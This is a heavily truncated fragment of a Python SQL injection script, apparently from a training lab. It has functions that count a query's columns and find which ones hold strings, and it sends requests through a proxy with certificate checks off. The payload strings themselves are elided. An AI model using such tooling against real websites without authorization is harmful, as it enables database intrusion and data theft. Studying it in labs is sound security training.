...
def exploit_sql_cokl_num(url):
    ...
    return False
def exploit_sqli_string_feild(url, num_col):
    ...
    for i in range(1, num_col + 1):
        ...
        req = requests.get(url + path + payload, proxies=proxies, verify=False)
        if string.strip('\'') in req.text:
            return i    
    return False    
...
if num_col:
    ...
    print("[+] figuring out which columns are string columns...")
    string_column = exploit_sqli_string_feild(url, num_col)
    if string_column:
        print(f"[+] The string column is {string_column}")  
    else:
        print("[-] Could not determine the string column")  
